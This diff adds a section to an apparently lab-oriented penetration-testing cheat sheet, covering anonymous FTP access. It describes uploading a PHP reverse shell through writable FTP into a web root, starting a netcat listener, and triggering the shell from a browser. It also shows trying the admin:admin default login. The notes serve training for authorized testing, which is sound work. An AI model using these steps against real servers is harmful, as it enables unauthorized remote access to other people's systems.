@@ -860,6 +860,19 @@ ftp&gt; get NECESSARY_FILE  # ONLY if this exact file is necessary to compromise
 ftp&gt; put shell.php       # Upload if writable and justified by your attack path
 ftp&gt; passive             # Toggle passive mode if connection issues
 
+# ── FTP UPLOAD → WEB-EXECUTED PHP (CHECK THIS PATH) ────────────
+# If the FTP directory is inside / mapped to a web-accessible directory:
+# 1) Confirm the matching web URL/path (e.g. FTP uploads land in the web root).
+# 2) Verify PHP is enabled for that directory; an uploaded .php file alone
+#    does not prove it will execute.
+# 3) In an authorized lab, upload a PHP reverse shell configured with your
+#    Kali tun0 IP and chosen listener port:
+#       ftp> put php-reverse-shell.php
+# 4) On Kali: nc -lvnp <LPORT>
+# 5) Browse to http://$IP/<web-path>/php-reverse-shell.php to trigger it.
+# If it does not connect, re-check URL-to-filesystem mapping, PHP handling,
+# upload permissions, callback IP/port and network reachability.
+
 # ── QUICK MANUAL DEFAULT-CREDENTIAL CHECK ─────────────────────
 # Also try admin:admin manually when anonymous access is unavailable.
 # At the FTP prompt: Name: admin  |  Password: admin
